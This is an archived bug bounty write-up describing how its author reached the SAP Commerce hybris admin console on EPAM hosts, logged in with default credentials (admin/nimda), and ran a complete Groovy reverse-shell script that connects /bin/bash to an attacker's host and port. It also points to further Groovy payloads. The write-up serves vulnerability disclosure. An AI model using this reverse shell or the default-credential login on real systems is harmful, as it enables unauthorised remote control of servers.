# How I got Two RCE at EPAM-Bounty Program

- **Source URL:** https://0xbartita.medium.com/how-i-got-two-rce-at-epam-bounty-program-389eb9fc7938?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20230713112423/https://0xbartita.medium.com/how-i-got-two-rce-at-epam-bounty-program-389eb9fc7938
- **Fetched:** 2026-11-27
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3280 (id 3280)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
How I got Two RCE at **EPAM**-Bounty Program

Hi all..

I like to get into the write up directly without any bla bla bla bla.

When I was hunting on **Epam** bounty program I went to shodan and searched for “ssl:epam.com” and I got this ip 40.117.\*\*.\*\*\* & Used dirsearch directly I found *http://40.117.\*\*.\*\*\*/hac/login/*

“The hac extension is **the default administration web application of SAP Commerce”.**

I googled for the default credential and I got it from here:

[https://www.cloudnir.com/sap-commerce-cloud-consoles/hybris-administrative-console-hac/](https://www.cloudnir.com/sap-commerce-cloud-consoles/hybris-administrative-console-hac/)

*Username: admin*

*Password: nimda*

And it’s worked i got into the admin panel.

I took a tour on the panel and I found a console Tab ==> *http://40.117.\*\*.\*\*\*/hac/console/scripting/*

As you can see script option is groovy scripting language you can know more about groovy *https://en.wikipedia.org/wiki/Apache\_Groovy*

Then I used this code to get remote code execution

```
String host="Your Ip Here";
int port=Your Port;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
You can find more payloads here *https://coldfusionx.github.io/posts/Groovy\_RCE/*

After I got **RCE** I went to shodan again and searched for more ips & I found the same **hac** application and reported it to the epam program

POC video → [https://youtu.be/Z8xcA3YWEjw](https://youtu.be/Z8xcA3YWEjw)

More groovy payloads → [https://coldfusionx.github.io/posts/Groovy\_RCE/](https://coldfusionx.github.io/posts/Groovy_RCE/)

Hackerone account → [https://hackerone.com/0xbartita](https://hackerone.com/0xbartita)

Twitter → [https://twitter.com/0xBaRtiTa](https://twitter.com/0xBaRtiTa)

Next Write-up I’m going to discuss How I got root privilege on the server
